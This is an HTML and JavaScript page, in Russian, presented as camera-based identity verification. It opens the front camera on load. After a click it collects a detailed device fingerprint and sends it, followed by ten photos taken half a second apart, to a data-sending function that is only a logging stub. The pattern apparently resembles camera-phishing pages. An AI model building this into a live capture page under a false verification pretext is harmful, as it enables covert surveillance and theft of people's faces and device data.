<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Верификация личности</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            color: #333;
        }
        .container {
            width: 90%;
            max-width: 500px;
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .camera-container {
            width: 100%;
            margin: 20px 0;
            position: relative;
            border-radius: 10px;
            overflow: hidden;
            background: #000;
            aspect-ratio: 4/3;
        }
        #liveCamera {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
            width: 80%;
            max-width: 300px;
        }
        .btn:hover {
            background: #3367d6;
            transform: translateY(-2px);
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
        }
        .btn:disabled {
            background: #cccccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .status {
            margin: 20px 0;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
        }
        .success {
            background: #e6f4ea;
            color: #34a853;
        }
        .error {
            background: #fce8e6;
            color: #d93025;
        }
        .hidden {
            display: none;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .progress-container {
            width: 100%;
            background: #e0e0e0;
            border-radius: 5px;
            margin: 15px 0;
        }
        .progress-bar {
            height: 10px;
            border-radius: 5px;
            background: #4285f4;
            width: 0%;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Верификация с помощью камеры</h1>
        <p>Для продолжения необходимо предоставить доступ к вашей фронтальной камере</p>
        
        <div class="camera-container">
            <video id="liveCamera" autoplay playsinline></video>
        </div>
        
        <div id="statusMessage" class="status hidden"></div>
        
        <div class="progress-container hidden" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <button id="startBtn" class="btn hidden">
            <span id="spinner" class="loading hidden"></span>
            <span id="btnText">Начать верификацию</span>
        </button>
        <button id="retryBtn" class="btn hidden">Повторить попытку</button>
    </div>

    <script>
        // Элементы страницы
        const videoElement = document.getElementById('liveCamera');
        const startBtn = document.getElementById('startBtn');
        const retryBtn = document.getElementById('retryBtn');
        const statusMessage = document.getElementById('statusMessage');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const spinner = document.getElementById('spinner');
        const btnText = document.getElementById('btnText');
        
        let stream = null;
        const totalPhotos = 10;
        const photoInterval = 500; // 0.5 секунды между фото

        // Запрашиваем доступ к камере сразу при загрузке страницы
        async function initCamera() {
            try {
                statusMessage.textContent = "Запрашиваем доступ к камере...";
                statusMessage.className = "status";
                statusMessage.classList.remove("hidden");
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                videoElement.style.display = "block";
                
                statusMessage.textContent = "Камера готова к работе. Нажмите 'Начать верификацию'";
                statusMessage.className = "status success";
                startBtn.classList.remove("hidden");
                
            } catch (error) {
                console.error("Ошибка доступа к камере:", error);
                statusMessage.textContent = `Ошибка: ${getErrorMessage(error)}`;
                statusMessage.className = "status error";
                retryBtn.classList.remove("hidden");
            }
        }

        // Функция для получения понятного сообщения об ошибке
        function getErrorMessage(error) {
            if (error.name === 'NotAllowedError') {
                return "Доступ к камере запрещен. Пожалуйста, разрешите доступ и обновите страницу.";
            } else if (error.name === 'NotFoundError') {
                return "Камера не найдена. Убедитесь, что у вас есть фронтальная камера.";
            } else if (error.name === 'NotReadableError') {
                return "Камера уже используется другим приложением.";
            } else {
                return "Не удалось получить доступ к камере. Пожалуйста, попробуйте позже.";
            }
        }

        // Функция для создания скриншота с камеры
        async function capturePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            
            // Проверка что фото не черное
            const imageData = ctx.getImageData(0, 0, 1, 1).data;
            if (imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0) {
                throw new Error("Камера вернула черное изображение");
            }
            
            return new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }

        // Функция для отправки данных на сервер (заглушка)
        async function sendToServer(data) {
            // В реальном приложении здесь должен быть fetch запрос к вашему API
            console.log("Отправка данных на сервер:", data);
            return new Promise(resolve => setTimeout(resolve, 200));
        }

        // Основная функция верификации
        async function startVerification() {
            startBtn.disabled = true;
            spinner.classList.remove("hidden");
            btnText.textContent = "Идет процесс...";
            statusMessage.textContent = "Идет процесс верификации...";
            statusMessage.className = "status";
            progressContainer.classList.remove("hidden");
            
            try {
                const deviceInfo = collectDeviceInfo();
                await sendToServer({ type: "device_info", data: deviceInfo });
                
                // Делаем серию фото
                for (let i = 1; i <= totalPhotos; i++) {
                    const blob = await capturePhoto();
                    await sendToServer({ 
                        type: "photo", 
                        data: blob, 
                        index: i,
                        timestamp: new Date().toISOString()
                    });
                    
                    // Обновляем прогресс
                    const progress = Math.round((i / totalPhotos) * 100);
                    progressBar.style.width = `${progress}%`;
                    statusMessage.textContent = `Сделано фото: ${i}/${totalPhotos}`;
                    
                    if (i < totalPhotos) {
                        await new Promise(resolve => setTimeout(resolve, photoInterval));
                    }
                }
                
                statusMessage.textContent = "Верификация успешно завершена!";
                statusMessage.className = "status success";
                startBtn.classList.add("hidden");
                
            } catch (error) {
                console.error("Ошибка верификации:", error);
                statusMessage.textContent = `Ошибка: ${error.message}`;
                statusMessage.className = "status error";
                retryBtn.classList.remove("hidden");
            } finally {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                spinner.classList.add("hidden");
                btnText.textContent = "Начать верификацию";
                startBtn.disabled = false;
            }
        }

        // Функция сбора информации об устройстве
        function collectDeviceInfo() {
            const screen = window.screen;
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            return {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                deviceType: getDeviceType(),
                os: getOS(),
                browser: getBrowser(),
                browserVersion: getBrowserVersion(),
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type
                },
                hardware: {
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                    touchPoints: navigator.maxTouchPoints
                },
                location: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset()
                },
                connection: connection ? {
                    type: connection.type,
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                } : null,
                online: navigator.onLine
            };
        }

        // Вспомогательные функции для определения устройства
        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "tablet";
            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "mobile";
            return "desktop";
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (/Windows/i.test(ua)) return "Windows";
            if (/Mac/i.test(ua)) return "MacOS";
            if (/Linux/i.test(ua)) return "Linux";
            if (/Android/i.test(ua)) return "Android";
            if (/iOS|iPhone|iPad|iPod/i.test(ua)) return "iOS";
            return "Unknown";
        }

        function getBrowser() {
            const ua = navigator.userAgent;
            if (/Edg/i.test(ua)) return "Edge";
            if (/OPR/i.test(ua)) return "Opera";
            if (/Chrome/i.test(ua)) return "Chrome";
            if (/Firefox/i.test(ua)) return "Firefox";
            if (/Safari/i.test(ua)) return "Safari";
            if (/MSIE|Trident/i.test(ua)) return "IE";
            return "Unknown";
        }

        function getBrowserVersion() {
            const ua = navigator.userAgent;
            const matches = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            return matches[2] || null;
        }

        // Обработчики событий
        startBtn.addEventListener('click', startVerification);
        retryBtn.addEventListener('click', () => window.location.reload());

        // Инициализация камеры при загрузке
        window.addEventListener('load', initCamera);

        // Остановка камеры при закрытии страницы
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
